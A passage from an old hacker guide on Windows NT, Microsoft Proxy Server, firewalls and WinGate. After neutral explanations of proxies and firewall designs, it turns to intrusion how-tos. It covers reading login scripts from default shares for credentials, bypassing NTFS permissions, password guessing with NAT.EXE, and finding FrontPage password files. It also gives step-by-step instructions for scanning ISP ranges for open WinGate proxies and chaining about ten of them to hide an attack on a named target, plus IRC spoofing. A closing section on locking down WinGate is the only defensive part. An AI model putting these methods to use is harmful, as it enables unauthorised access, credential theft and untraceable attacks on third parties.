and the server to manage the ability of Windows Sockets messages to be used remotely. The 
control channel is set up when the WinSock Proxy client DLL is first loaded, and it uses the 
connectionless UDP protocol. The Winsock Proxy client and the WinSock Proxy service use 
a simple ack protocol to add reliability to the control channel. The control channel uses UDP 
port 1745 on the proxy server and client computers.
? SOCKS Proxy: Proxy Server supports SOCKS Version 4.3a. Almost all SOCKS V4.0 client 
applications can run remotely through SOCKS Proxy. SOCKS is a protocol that functions as 
a proxy. It enables hosts on one side of a SOCKS server to gain full access to hosts on the 
other side of a SOCKS server, without requiring direct IP access.  (To learn more about 
SOCKS, visit http://www.socks.nec.com/index.html).

[7.1.0] Understanding components

This area will attempt to better define to the components of the architecture that we have used, 
but may not have defined.

[7.1.1] ISAPI Filter

The ISAPI Filter interface is one of the components of the web proxy service. The interface 
provides an extension that the Web server calls whenever it receives an HTTP request.

An ISAPI Filter is called for every request, regardless of the identity of the resource requested in 
the URL. An ISAPI filter can monitor, log, modify, redirect and authenticate all requests that are 
received by the Web server. The Web service can call an ISAPI filter DLL's entry point at various 
times in the processing of a request or response. The Proxy Server ISAPI filter is contained in the 
w3proxy.dll file. This filter examines each request to determine if the request is a standard HTTP 
request or not.

[7.1.2] ISAPI Application

The ISAPI Application is the second of the two web proxy components.  ISAPI applications can 
create dynamic HTML and integrate the web with other service applications like databases.

Unlike ISAPI Filters, an ISAPI Application is invoked for a request only if the request references 
that specific application. An ISAPI Application does not initiate a new process for every request. 
The ISAPI Application is also contained in the w3proxy.dll file.

[7.1.3] Proxy Servers Caching Mechanism

Microsoft Proxy Server handles caching in two different ways, Passive and Active caching.

? Passive Caching: Passive caching is the basic mode of caching. Proxy Server interposes 
itself between a client and an internal or external Web site and then intercepts client 
requests. Before forwarding the request on to the Web server, Proxy Server checks to see if 
it can satisfy the request from its cache. Normally, in passive caching, Proxy Server places a 
copy of retrieved objects in the cache and associates a TTL (time-to-live) with that object. 
During this TTL, all requests for that object are satisfied from the cache. When the TTL is 
expired, the next client request for that object will prompt Proxy Server to retrieve a fresh 
copy from the web. If the disk space for the cache is too full to hold new data, Proxy Server 
removes older objects from the cache using a formula based on age, popularity, and size.
? Active Caching: Active Caching works with passive caching to optimize the client 
performance by increasing the likelihood that a popular will be available in cache, and up to 
date. Active caching changes the passive caching mechanism by having the Proxy Server 
automatically generate requests for a set of objects. The objects that are chosen are based 
on popularity, TTL, and Server Load.

[7.1.4] Windows Sockets

Windows Sockets is the mechanism for communication between applications running on the 
same computer or those running on different computers which are connected to a LAN or WAN. 
Windows Sockets defines a set of standard API's that an application uses to communicate with 
one or more other applications, usually across a network. Windows Sockets supports initiating an 
outbound connection, accepting inbound connections, sending and receiving data on those 
connections, and terminating a session.

Windows socket is a port of the Berkeley Sockets API that existed on Unix, with extensions for 
integration into the Win16 and Win32 application environments. Windows Sockets also includes 
support for other transports such as IPX/SPX and NetBEUI.

Windows Sockets supports point-to-point connection-oriented communications and point-to-point 
or multipoint connectionless communications when using TCP/IP. Windows Socket 
communication channels are represented by data structures called sockets. A socket is identified 
by an address and a port, for example;

131.107.2.200:80

[7.1.5] Access Control Using Proxy Server

[7.1.6] Controlling Access by Internet Service

Proxy Server can be configured to provide or restrict access based on Service type. FTP, HTTP, 
Gopher, and Secure (SSL) are all individually configurable.

[7.1.7] Controlling Access by IP, Subnet, or Domain

Proxy allows an administrator to control access based on IP Address, Subnet or Domain. This is 
done by enabling filtering and specifying the appropriate parameters. When configuring this 
security, you need to decide if you want to grant or deny access to an IP address, subnet, or 
domain.  By configuring Proxy Server correctly, you can also set it up to use the internet as your 
corporate WAN.

[7.1.8] Controlling Access by Port

If you are using the WinSock Proxy service, you can control access to the internet by specifying 
which port is used by TCP and UDP. You can also grant or deny, activate or disable certain ports 
based on your needs.

[7.1.9] Controlling Access by Packet Type

Proxy Server can control access of external packets into the internal network by enabling packet 
filtering on the external interface. Packet filtering intercepts and evaluates packets from the 
Internet before they reach the proxy server. You can configure packet filtering to accept or deny 
specific packet types, datagrams, or packet fragments that can pass through Proxy Server. In 
addition, you can block packets originating from a specific Internet host.

The packet filtering provided by Proxy Server is available in two forms, Dynamic and Static.

Dynamic packet filtering allows for designed ports to automatically open for transmission, receive, 
or both. Ports are then closed immediately after connection has been terminated, thereby 
minimizing the number of open ports and the duration of time that a port is open.

Static packet filtering allows manual configuration of which packets are and are not allowed.

By default, the following Packet settings are enabled on Proxy Server (by default, ALL packet 
types are blocked except the ones listed below, known as Exceptions):

Inbound	 ICMP ECHO (Ping)
Inbound 	 ICMP RESPONSE (Ping)
Inbound 	 ICMP SOURCE QUENCH
Inbound 	 ICMP TIMEOUT
Inbound 	 ICMP UNREACHABLE
Outbound 	 ICMP ANY
Inbound 	 TCP HTTP
In/Outbound       UDP ANY (dns)

[7.2.0] Logging and Event Alerts

Events that could affect your system may be monitored, and, if they occur, alerts can be 
generated. The items listed below are events that will generate alerts:

Rejected Packets: Watches external adapter for dropped IP packets.
Protocol Violations: Watches for packets that do not follow the allowed protocol structure.
Disk Full: Watches for failures caused by a full disk.

When any of the events above occur, an alert is sent to the system log in the NT Event Viewer, or 
can be configured to e-mail a pre-defined person.

When the system logs information concerning Access Control, it does so to a log file stored in the 
%systemroot%/system32/msplogs/ directory. The log file itself is named Pfyymmdd.log (Where 
yy=Current year / mm= Current Month / dd= Current day).

The Packet log records information related to the following areas:

Service Information (Time of Service, Date and Time)
Remote Information (The Source IP Address of a possible Intruder, along with port and protocol 
used)
Local Information (Destination IP Address and port)
Filter Information (Action taken and what interface (network adapter) issued the action)
Packet Information (Raw IP Header in Hex and Raw IP Packet in Hex)

[7.2.1] Encryption Issues

Proxy Server can take full advantage of the authentication and security features of Internet 
Information Server and SSL tunneling.

SSL supports data encryption and server authentication. All data sent to and from the client using 
SSL is encrypted. If HTTP basic authentication is used in conjunction with SSL, the user name 
and password are transmitted after the client's SSL support encrypts them.

If your are wanting to take advantage of PPTP to provide additional flexibility and security for your 
clients, you can configure Proxy Server to allow these packets (GRE) to pass through.

[7.2.2] Other Benefits of Proxy Server

[7.2.3] RAS

Proxy Server can take full advantage of Windows NT Remote Access Service (RAS).  Proxy can 
be configured to dial on demand when an internal client makes a request that must be satisfied 
from the external network. The RAS feature can be configured to only allow connectivity during 
certain hours. The Dial-Up Network Scripting tool can aslo be used to automate certain process 
using Proxy Server and RAS. For company's who have a standard constant connection (ISDN, 
T1, T3) to the Internet, the RAS ability provided by Proxy Server can be used as a back-up 
should your constant connection fail.

[7.2.4] IPX/SPX

Microsoft Proxy Server was developed with support for Internet Packet Exchange/Sequenced 
Packet Exchange or IPX/SPX. IPX/SPX is a transport protocol group somewhat similar to TCP/IP. 

There are many situations when a client computer may have both IPX/SPX and TCP/IP protocols 
installed although the company's internal network may only use IPX/SPX. Simply disabling 
aTCP/IP while on the LAN will not get the IPX/SPX component of the Proxy client software 
working. You will need to go into Control Panel, open the Wsp Client icon and check the box that 
reads "Force IPX/SPX protocol". This must be done because even though the TCP/IP protocol 
was disabled, the WinSock Proxy Client still detects its presence and will attempt to create a 
standard IP socket. By enabling the "Force IPX/SPX Protocol" option, this problem should 
disappear.

[7.2.5] Firewall Strategies

A firewall is a system that enforces access control policies. The enforcement is done between an 
internal, or "trusted" network and an external, or "untrusted" network. The firewall can be as 
advanced as your standards require. Firewalls are commonly used to shield internal networks 
from unauthorized access via the Internet or other external network.

[7.2.6] Logical Construction

The single basic function of a firewall is to block unauthorized traffic between a trusted system 
and an untrusted system. This process is normally referred to as Filtering. Filtering can be viewed 
as either permitting or denying traffic access to a network.

Firewalls know what traffic to block because they are configured with the proper information. This 
information is known as an Access Control Policy. The proper approach to an access control 
policy will depend on the goals of the network security policy and the network administrator.

[7.2.7] Exploring Firewall Types

In the origins of firewalls, there were two types. These two types have now grown and overlapped 
each other to the point where distinction is hard. We will explore the differences between these 
two types and discuss Firewall building topologies.

Network Level Firewalls

Network level firewalls operate at the IP packet level. Most of these have a network interface to 
the trusted network and an interface to the untrusted network. They filter by examining and 
comparing  packets to their access control policies or ACL's.

Network level firewalls filter traffic based on any combination of Source and Destination IP, TCP 
Port assignment and Packet Type. Network Level firewalls are normally specialized IP routers. 
They are fast and efficient and are transparent to network operations. Todays network level 
firewalls have become more and more complex. They can hold internal information about the 
packets passing through them, including the contents of some of the data. We will be discussing 
the following types of network level firewalls:

? Bastion Host
? Screened Host
? Screened Subnet

Bastion Host Firewall

Bastion host are probably one of the most common types of firewalls. The term bastion refers to 
the old castle structures used in Europe, mainly for draw bridges.

The Bastion host is a computer with at east one interface to the trusted network and one to the 
untrusted network. When access is granted to a host from the untrusted network by the bastion 
host, all traffic from that host is allowed to pass unbothered.
In a physical layout, bastion hosts normally stand directly between the inside and outside 
networks, with no other intervention. They are normally used as part of a larger more 
sophisticated firewall. 

The disadvantages to a bastion host are:

? After an Intruder has gained access, he has direct access to the entire network.
? Protection is not advanced enough for most network applications.

Screened Host Firewall

A more sophisticated network level firewall is the screened host firewall. This firewall uses a 
router with at least on connection to trusted network and one connection to a bastion host. The 
router serves as a preliminary screen for the bastion host. The screening router sends all IP traffic 
to the bastion host after it filters the packets. The router is set up with filter rules. These rules 
dictate which IP addresses are allowed to connect, and which ones are denied access. All other 
packet scrutiny is done by the bastion host. The router decreases the amount of traffic sent to the 
bastion host and simplifies the bastions filtering algorithms.

The physical layout of a Screened Host is a router with one connection to the outside network, 
and the other connection with a bastion host. The bastion host has one connection with the router 
and one connection with the inside network.

Disadvantages to the Screened Host are:

? The single screen host can become a traffic bottleneck
? If the host system goes down, the entire gateway is down.

Screened Subnet Firewalls

A screened subnet uses on or more addition routers and on more additional bastion hosts. In a 
screened subnet, access to and from the inside network is secured by using a group of screened 
bastion host computers. Each of the bastion hosts acts as a drawbridge to the network.

The physical layout of a Screened subnet is somewhat more difficult, but the result is a more 
secure, robust environment. Normally, there is a router with one connection to the outside 
network and the other connection to a bastion host. The bastion host has one connection to the 
outer most router and one connection to another bastion host, with an addressable network in the 
middle. The inner most bastion host has one connection to the outer most bastion and another 
connection to an inside router. The inside router has one connection to the inner bastion host and 
the other connection to the inside network. The result of this configuration is the security 
components are normally never bogged down with traffic and all internal IP addresses are hidden 
from the outside, preventing someone from "mapping" your internal network.

Disadvantages to using this type of firewall are:

? The can be two or three times more expensive than other types of firewalls
? Implementation must be done by some type of security professional, as these types of 
firewalls are not for the un-initiated.

Application Level Firewalls

 Application level firewalls are hosts running proxy server software located between the protected 
network and the outside network. Keep in mind that even though Microsofts product is called 
Proxy Server 2.0, it is actually a stand alone Bastion Host type of system. Microsoft Proxy Server 
can also, single-handedly, disguise your internal network to prevent mapping. Microsoft Proxy 
Server 1.0 did not have many of the advanced features presented in version 2.0. The 1.0 version 
can definitely be called a true proxy server, while the 2.0 version is more of a firewall.

Viewed from the client side, a proxy server is an application that services network resource 
requests by pretending to be the target source. Viewed from the network resource side, the proxy 
server is accessing network resources by pretending to be the client. Application level firewalls 
also do not allow traffic to pass directly between to the two networks. They are also able to use 
elaborate logging and auditing features. They tend to provide more detailed audit reports, but 
generally, as stand alone security unites, do not perform that well. Remember that an Application 
level firewall is software running on a machine, and if that machine can be attacked effective and 
crashed, in effect, youre crashing the firewall.

You may wish to use an application level firewall in conjunction with network level firewalls, as 
they provide the best all around security.

[7.2.3] NT Security Twigs and Ends

Lets jump right in. For those of  you who are not riggers (architecture/network media specialists) 
let me begin by saying that NT as an operating system is fairly safe and secure. Now you may 
think to yourself that it isn’t, but think about all the Unix related security holes you know of, a ton 
huh? Anyhow, as with any operating system, NT has holes, lets see what we can learn about 
these holes, shall we?

 First things first, NT does not support alot of  the normal TCP/IP functions that youre used to. NT 
does not normally support NFS, SunRPC, NIS, r* commands, Telnet, and some other obscure 
ones. 

 In order for NT to allow for various system services to be performed on a remote computer, it 
uses RPC, remote procedure calls. Please do not confuse this with SunRPC. You can run 
NT/RPC's over a NetBIOS/SMB session or you can piggie back it directly off of  TCP/IP (or other 
transport protocol, perhaps NWLink IPX/SPX). Unfortunately we dont have any good 
documentation on what inherent services NT provides through native RPC. Complex server type 
programs (Like Exchange) provide their own RPC services in addition to the ones NT provides as 
an operating system --(TCP Port 135 is used as a port-mapper port, we also know that if too 
much information is fed through port 135, you can crash an NT box.). Some client software must 
access TCP port 135 before accessing the RPC service itself (hint, hint). Keep in mind that TCP 
port 135 can be blocked. Bummer, eh?
 One problem among the Hacker community is that most hackers dont like to investigate new 
avenues, or explore new methods. They will take the easy way out, using a method thats already 
been documented by someone else. So what if they come across a system that has patched that 
security problem? Will todays hacker try to find a new way in? Nope... most of the slackers I know 
will give up. It is for this reason that alot of the members in the community have never heard of 
SMBs, because its a session level protocol  that is not a Unix standard (although there is 
something somewhat like SMBs for Unix, known as Samba). SMBs are used by Windows 3.X, 
Win95, WintNT and OS/2. The one thing to remember about SMBs is that it allows for remote 
access to shared directories, the registry, and other system services. Which makes it important in 
our line of, uuuhh, work. As stated above, unfortunately, there is no good documentation of the 
services that use SMBs. 

  Now, a couple of Key Points:
      SMBs are used by:
         -Win 3.X
         -Win 95
         -Win NT
         -OS/2
      SMBs allow for remote access to:
         -Shared directories
         -The Registry
         -Other system services

  You will find that by default all accounts in NT have complete SMB functionality. This includes 
the Guest account. (In WinNT 3.51, the guest is auto created and active, in WinNT 4.0, the guest 
account is auto created but is not active) Now, 2 things to remember: When it comes to login 
attempt failures, the administrator account IS NEVER locked out after a certain number of login 
attempts (this rule ALWAYS applies), also by default, when windows NT is installed, NONE of the 
accounts have fail login attempt lock out. Also, in order for SMB to work, UDP/TCP ports 
137,138,139 (NetBIOS over TCP) must be open.

---A word about Remote registry alteration: By default the Everyone group in NT has write access 
to much of the registry. In NT 3.51, this was a major issue due to the remote registry access 
feature of RegEdit. Any user could manipulate the registry on any server or workstation on which 
his account (or the guest account) was enabled. WindowsNT fixed the problem with this registry 
key:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipesServers\winreg

Now, true, remote registry editing is not allowed in NT4, but this rule does not apply to 
Administrator (or perhaps other users in the Administrators group.. ::grin::).

 Ok, so far we've covered some pretty good information, but lets go into that new product that 
microsoft loves so much. The product they really hyped.. NTFS (NewTechnologiesFileSystem). 
First of all, NTFS is a rip off of the OS/2 file system, HPFS. No biggie, lets not get picky. Anyhow, 
NTFS is actually a beautiful thing, if used properly. NTFS allows administrator to not only put 
access permissions on folders, but it also allows for access permissions on individual files within 
that folder. 

Example: Jane and Ralph both have access to the folder 'Shoes'. Theres only one file within the 
'shoes' folder. Only jane has access to this one file, Ralph does not. So when Ralph opens the 
'shoe' folder, it appears empty, but when Jane opens the 'shoe' folder, the file is there. 

Now, If an administrator does not set permissions on files within a folder but you know the exact 
path to the file, you can copy the file out of the folder onto a FAT (File Allocation Table) system, 
successfully bypassing the security. Example:

The folder 'Shoes' has permissions on it. You do not have access permission to the folder, BUT if 
you typed:

      copy c:\shoes\secure.txt a:\

 It would allow you to copy the file. Pretty neat huh?

I have heard that the latest NT4 patches have corrected this problem, I will let ya know when I get 
a chance to test it out.

File Sharing, I love those words. SMB file and print server protocols used by NT are harder to 
spoof than the NFS implementation on Unix systems. It is possible that a gateway (and I dont 
mean the brand name company) machine could spoof an SMB session, then read and write any 
files to which the true user of the session had access. -WARNING- This method is not for the 
beginner.

Now, windows allows for this wonderful thing called User Profiles. This allows for users to have 
login scripts, personalized desktops, etc etc. Now some very personal information can be 
contained within these profiles. For example, some users put the userid and password that they 
use for Microsoft Mail onto their logon script, this way when they log into the machine, it auto logs 
them into their mailbox. User profiles are stored in the %SYSTEMROOT%\SYSTEM32\CONFIG 
directory and also on a shared directory on the server. 

Lets discuss our little friend, the special share. NT shares the 
%SYSTEMROOT%\SYSTEM32\REPL\IMPORT\SCRIPTS directory, this way, users can read 
their login scripts during login. Under normal default conditions, ANYONE can access this share 
and read anyone elses login script. So whatever juicy pieces of information are in the login script 
are now yours. Some other special shares are created depending on other software installed on 
NT or other servers that NT has to cooperate with. These other shares will probably be discussed 
in another BlackPaper.

Getting lucky with that special account. There is a certain type of NT account that has the ability 
to BackUp and Restore database and account information. Accounts of this type have the ability 
to read, modify and write any file in the system. So, if ya cant get the Admin account, who 
knows... maybe theres a backup operator account. Ya never know.


==============Part Two==============
===================The Techniques for Survival===================


[8.0.0] NetBIOS Attack Methods

This NetBIOS attack technique was verified on Windows 95, NT 4.0 Workstation, NT 4.0 Server, 
NT 5.0 beta 1 Workstation, NT 5.0 beta 1 Server, Windows 98 beta 2.1. One of the components 
being used is NAT.EXE by Andrew Tridgell. A discussion of the tool, it switches, and common 
techniques follows:

NAT.EXE [-o filename] [-u userlist] [-p passlist] <address>

Switches:

       -o     Specify the output file.  All results from the scan
              will  be written to the specified file, in addition
              to standard output.
       -u     Specify the file to read usernames from.  Usernames
              will  be read from the specified file when attempt-
              ing to guess the password  on  the  remote  server.
              Usernames  should appear one per line in the speci-
              fied file.
       -p     Specify the file to read passwords from.  Passwords
              will  be read from the specified file when attempt-
              ing to guess the password  on  the  remote  server.
              Passwords  should appear one per line in the speci-
              fied file.
       <address>
              Addresses should be specified in comma  deliminated
              format,  with  no spaces.  Valid address specifica-
              tions include:
              hostname - "hostname" is added
              127.0.0.1-127.0.0.3,   adds   addresses   127.0.0.1
              through 127.0.0.3
              127.0.0.1-3,   adds   addresses  127.0.0.1  through
              127.0.0.3
              127.0.0.1-3,7,10-20,   adds   addresses   127.0.0.1
              through  127.0.0.3,  127.0.0.7,  127.0.0.10 through
              127.0.0.20.
              hostname,127.0.0.1-3, adds "hostname" and 127.0.0.1
              through 127.0.0.1
              All combinations of hostnames and address ranges as
              specified above are valid.

[8.0.1] Comparing NAT.EXE to Microsoft's own executables

[8.0.2] First, a look at NBTSTAT
 
First we look at the NBTSTAT command. This command was discussed in earlier portions of the 
book ( [5.0.6] The Nbtstat Command ). In this section, you will see a demonstration of how this 
tool is used and how it compares to other Microsoft tools and non Microsoft tools. 

What follows is pretty much a step by step guide to using NBTSTAT as well as extra information. 
Again, if youre interested in more NBSTAT switches and functions, view the [5.0.6] The Nbtstat 
Command portion of the book.

[8.0.3] Intro to the NET commands

The NET command is a command that admins can execute through a dos window to show 
information about servers, networks, shares, and connections. It also has a number of command 
options that you can use to add user accounts and groups, change domain settings, and 
configure shares. In this section, you will learn about these NET commands, and you will also 
have the outline to a NET command Batch file that can be used as a primitive network security 
analysis tool. Before we continue on with the techniques, a discussion of the available options will 
come first:

[8.0.4] Net Accounts: This command shows current settings for password, logon limitations, and 
domain information. It also contains options for updating the User accounts database and 
modifying password and logon requirements.

[8.0.5] Net Computer: This adds or deletes computers from a domains database.

[8.0.6] Net Config Server or Net Config Workstation: Displays config info about the server 
service. When used without specifying Server or Workstation, the command displays a list of 
configurable services.

[8.0.7] Net Continue: Reactivates an NT service that was suspended by a NET PAUSE 
command.

[8.0.8] Net File: This command lists the open files on a server and has options for closing shared 
files and removing file locks.

[8.0.9] Net Group: This displays information about group names and has options you can use to 
add or modify global groups on servers.

[8.1.0] Net Help: Help with these commands

[8.1.1] Net Helpmsg message#: Get help with a particular net error or function message.

[8.1.2] Net Localgroup: Use this to list local groups on servers. You can also modify those 
groups.

[8.1.3] Net Name: This command shows the names of computers and users to which messages 
are sent on the computer.

[8.1.4] Net Pause: Use this command to suspend a certain NT service.

[8.1.5] Net Print: Displays print jobs and shared queues.

[8.1.6] Net Send: Use this command to send messages to other users, computers, or messaging 
names on the network.

[8.1.7] Net Session: Shows information about current sessions. Also has commands for 
disconnecting certain sessions.

[8.1.8] Net Share: Use this command to list information about all resources being shared on a 
computer. This command is also used to create network shares.

[8.1.9] Net Statistics Server or Workstation: Shows the statistics log.

[8.2.0] Net Stop: Stops NT services, cancelling any connections the service is using. Let it be 
known that stopping one service, may stop other services.

[8.2.1] Net Time: This command is used to display or set the time for a computer or domain.

[8.2.2] Net Use: This displays a list of connected computers and has options for connecting to 
and disconnecting from shared resources.

[8.2.3] Net User: This command will display a list of user accounts for the computer, and has 
options for creating a modifying those accounts.

[8.2.4] Net View: This command displays a list of resources being shared on a computer. 
Including netware servers.

[8.2.5] Special note on DOS and older Windows Machines: The commands listed above are 
available to Windows NT Servers and Workstation, DOS and older Windows clients have these 
NET commands available:

Net Config
Net Diag (runs the diagnostic program)
Net Help
Net Init (loads protocol and network adapter drivers.)
Net Logoff
Net Logon
Net Password (changes password)
Net Print
Net Start
Net Stop
Net Time
Net Use
Net Ver (displays the type and version of the network redirector)
Net View

For this section, the command being used is the NET VIEW and NET USE commands.

[9.0.0] Frontpage Extension Attacks
    
Ofcourse, everyone should know what Microsoft Frontpage is. The server extensions are installed 
server side to provide added functionality for frontpage web authors. These extensions function 
as “web bots” if you will, giving web authors that use frontpage easy access to complex web and 
HTML functions. Soon after the extensions came into wide use, security concerns began to pop-
up. Most of these security concerns were very basic, the collection presented below are PROVEN 
methods that have been tested repeatedly in several types of configurations. 

[9.0.1] For the tech geeks, we give you an actual PWDUMP

This is the pwdump from the webserver the Lan Manager password is set to "password". This 
PWDUMP example is for those of you that have heard about the utility but may have never 
actually seen the output of one. This dump was used by Vacuum of rhino9 during his journey into 
cracking the NT encryption algorithm.

[9.0.2] The haccess.ctl file

The hacces.ctl file is sometimes called a shadow password file, well, this is not exactly correct. 
The file can give you a lot of information, including the location of the service password file. A 
complete example of the haccess.ctl file is given below:

The #haccess.ctl file:

# -FrontPage-

Options None

<Limit GET POST PUT>
order deny,allow
deny from all
</Limit>
AuthName default_realm
AuthUserFile c:/frontpage\ webs/content/_vti_pvt/service.pwd
AuthGroupFile c:/frontpage\ webs/content/_vti_pvt/service.grp

Executing fpservwin.exe allows frontpage server extensions to be installed on

port 443 (HTTPS)Secure Sockets Layer
port 80  (HTTP)

NOTE: The Limit line. Telneting to port 80 or 443 and using GET, POST, and PUT can be used
instead of Frontpage.

FrontPage creates a directory _vti_pvt for the root web and for each FrontPage sub-web. For 
each FrontPage web with unique permissions, the _vti_pvt directory contains two files for the 
FrontPage web that the access file points to: 
service.pwd contains the list of users and passwords for the FrontPage web. 
service.grp contains the list of groups (one group for authors and one for administrators in 
FrontPage). 
On Netscape servers, there are no service.grp files. The Netscape password files are: 
administrators.pwd for administrators 
authors.pwd for authors and administrators 
users.pwd for users, authors, and administrators

The ftp service by default runs on the standard port 21.
Check to see if anonymous connections are allowed. By default, Internet Information Server 
creates and uses the account IUSR_computername for all anonymous logons. Note that the 
password is used only within Windows NT ; anonymous users do not log on using this user name 
and password.

Typically, anonymous FTP users will use "anonymous" as the user name and their e-mail 
address as the password. The FTP service then uses the IUSR_computername account as the 
logon account for permissions. When installed, Internet Information Server’s  Setup created the 
account IUSR_computername in the Windows NT User Manager for Domains and in Internet 
Service Manager. This account was assigned a random password for both in Internet Service 
Manager and in the Windows NT User Manager for Domains. If changed, the password, you must 
change it in both places and make sure it matches.

NOTE: Name and password are case sensitive

[10.0.0] WinGate

There have been a few papers about WinGate. Some have explained how to bounce through its 
port 23 telnet proxy. Some have explained how to secure it. In this section we will show you how 
to use WinGate for its good and bad and you will learn from the good and bad examples. People 
in the past have said there are flaws and exploits to WinGates and this is wrong. There are 
system admins that poorly configure their systems but it is not WinGate itself that is the flaw.

[10.0.1] What Is WinGate?

WinGate is basically a program that lets you split a connection. Ex: You can share 1 modem with 
2 computers. WinGate comes with several proxies and that is where the possible threat lies. (This 
sharing of internet connection is known as Connection Aggregation)

Note: We will only talk about 3 of the more used proxy portions of WinGate.

[10.0.2] Defaults After Install

When you do a regular install of WinGate without changing things there are a few defaults:
Port:  | Service:
23      Telnet Proxy Server - This is default and running right after install.
1080  SOCKS Server - This once setup via GateKeeper has no password until you set one.
6667  IRC Mapping - This once setup via GateKeeper has no password until you set one.

The biggest threat to your server is the port 23 telnet proxy. 

[10.0.3] Port 23 Telnet Proxy

This proxy is setup and run as soon as you are done installing and to make things worse it has no 
password after install and doesn’t ask you for one. Most system admins dont even know this and 
dont even think to try to password it and that is where the problem arises.

The telnet proxy is quiet simple. You telnet to port 23 on the server that is running the WinGate 
telnet proxy and you get a prompt WinGate> At this prompt you type in the server then a space 
and the port you want to connect to.

Example:
telnet wingate.net
Connected to wingate.net

WinGate> victim.com 23

What this example shows is someone telnetting to the WinGate server and then from that 
WinGate server telnet out of it to victim.com so on victim.com's logs it will show the wingate IP 
(wingate.net) and therefore the person telnetting keeps her IP a secret.

[10.0.4] Port 1080  SOCKS Proxy

The socks proxy is not installed by default but as soon as you use GateKeeper to install it. It 
installs with no password, unless you set one. If you are familiar with socks you know that there 
are many things you could do with it.

[10.0.5] Port 6667  IRC Proxy

The irc proxy is like how we would do a wingate telnet proxy bounce to an irc server except the irc 
proxy is set to goto a certain server already. This is not set to run after install but after you do 
install it it setups with no password, unless you set one.

[10.0.6] How Do I Find and Use a WinGate?

Finding WinGates are relatively easy to do. If you would like to find static IP WinGates (IP never 
changes) go to yahoo or something of the such and search for cable modems. The reason for 
searching for cable modems is because a lot of people with cable modems have WinGate so that 
they can split there cable modems large bandwidth and share it with the other computers in there 
house. One large cable modem company is Cox Cable. Their webpage can be found at 
www.home.com. The Cox Cable rang of IP's are: 24.1.X.X where depending on what number X 
equals is where in the country the cable modem is located. You can also use Port or Domain 
scanners and scan for Port 1080, which Identifies a SOCKS Proxy, this is also an easy way to 
find a WinGate.

Example:
24.1.67.1 Resolves to c224084-a.frmt1.sfba.home.com which from that we know the abreveation 
sfba = San Fransico Bay Area or something close to that.
That is how to find static IP WinGates. To find dynamic IP (IP's that change every time a user 
logs on to the internet) WinGates it is not to hard at all. Almost every ISP big and small has users 
with WinGate. You need to either know the format of an ISP's dynamic ppp addresses or you 
need to get on IRC (Internet Relay Chat) and see what they are that way. Say that you already 
have a ppp IP of armory-us832.javanet.com. Now you dns that IP and get 209.94.151.143 now 
you take the IP address and stick it into a domain scanner program. Ex: Domscan which can be 
found on the Rhino9 web site (rhino9.abyss.com) Ok so you have domscan now. Run domscan 
and there is a box where you put in the IP address and the port to scan for. The WinGate telnet 
proxy by default runs on port 23. So we put in 209.94.151.143 in the first box in the domscan 
program and then 23 in the second box and then click start. The results we will get are: 

209.94.151.2
209.94.151.4
209.94.151.6
209.94.151.10
209.94.151.8
209.94.151.73
209.94.151.118
209.94.151.132

Now we have to check each of these IP's for the WinGate prompt. So to do that we need to telnet 
to 209.94.151.2 on port 23 and if it shows WinGate> right when we connect then it is a WinGate. 
If not we go to the next address which in this case would be 209.94.151.4. We would do that for 
the whole list of IP's.

Note: If we are scanning for dynamic IP WinGates it is more common that the last number of the 
IP of the WinGate will be higher. Ex: There is a better chance that 209.94.151.132 is a WinGate 
and that 209.94.151.2 is not a WinGate. 

[10.0.7] I have found a WinGate telnet proxy now what?

Well there are many uses for WinGate. The first use and probably the greatest is the WinGate 
bounce technique. Say you are going to hack the pentagon. You can use the WinGate technique 
to keep yourself from having a jail sentence with spike. Here is how it works. We get a collection 
of WinGate IP's. First we open our telnet program and telnet to the first WinGate on our list. We 
get the WinGate> prompt and at that prompt we type the second WinGate on our list then a 
space then 23 then hit enter. Then we get another WinGate prompt and at that prompt we type 
the third WinGate IP on our list then a space then 23 then enter and so on and so fourth until we 
have bounced through about 10 or so WinGates  then on the tenth WinGate we enter in the 
pentagon addresss. Ex: WinGate> www.pentagon-ai.army.gov 23 and then hit enter and start 
hacking away at it. So you ask, well cant they just trace back through all the WinGates? They 
could try to trace it back and here is how it would work. The pentagon has an IP on there logs, the 
ip is 2.2.2.2. The pentagon know that IP belongs to the an internet service provider called 
interlink. So the pentagon calls interlink and then tells them that at 3:43am on sunday an ip 
address of 2.2.2.2 hacked into there computer system. So the ISP (internet service provider) 
checks there logs and sees that there user John Doe was on at that time with that IP on sunday. 
So the pentagon has the swat team do a raid on John Doe's house and find nothing. Now it could 
end right here or the pentagon will maybe see that John Doe has WinGate and then check his 
logs. Now most people with WinGate dont even log so the pentagon could be stumped right there 
once again or they might see that another IP went through that WinGate and then they will have 
to repeat the process of calling the ISP and repeat that whole process again. Now if we went 
through 10 WinGate IP's you know that somewhere in that 10 either the ISP or the WinGate user 
wont know what IP was going through them, in otherwords if you bounce through 10 WinGate 
IP's you are a ghost, thy samurai... That is one use of WinGate's telnet proxy. Note: you might 
need to do a control + enter at the WinGate> prompt, it differs between telnet clients. Another use 
can be for IRC spoofing. To do this we take a WinGate ip and in our irc client we connect to that 
WinGate IP. This is an example of how it would look in mIRC for Windows. Do these commands:
1. /server wingate.net
It then connects.
2. /quote irc.irc.net 6667
It then connects to the irc server.
3. /quote user whatever whatever whatever@server.com whatever
4. /quote nick whatever
This sends the irc client info. Read the irc rfc for more info on that.
Once we have done /quote nick whatever mirc will be totally connected and we can then do 
whatever we want and our IP on IRC will be wingate.net or whatever the wingate IP is. So think 
about it and I am sure you can think of a few fun things to do with someone elses IP. Note: For 
you people that choose to abuse this. I have already coded an anti-wingate script for IRC to 
detect you mean people that choose to abuse this.
Those are 2 of the more common things to do with WinGate telnet proxies.

[10.0.8] Securing the Proxys

Service That Need To Be Locked To Stop Bouncing

23 - Telnet Proxy Server
1080 - SOCKS Server
6667 - IRC Mapping

All Ports Can Be Locked The Same Way

1-	Load Gatekeeper
2-	Logon To Wingate Server As Administrator
3-	Select Service To Lock
4-	Right Click And Pick Properties
5-	Option One Of Lock Down Is Click "Bind to specific interface" and put 127.0.0.1 in the box
6-	Other Way To Lock Down A Service Is Select Policies, Double Click on "Everyone 
Unrestricted Rights", Click on Location Tab, Click on "Specify locations from where this 
recipient has rights" next you will be entering the IP(s) you what to give access to this service 
(Add 127.0.0.1 so the local box has access) you can add by each IP or by groups of IPs like 
199.170.0. *    

Some Other Notes Guest Account Has No Password and Enable on Install Basic Install Let's 
EVERONE have access to bounce from your system. All ports but the "remote control service" is 
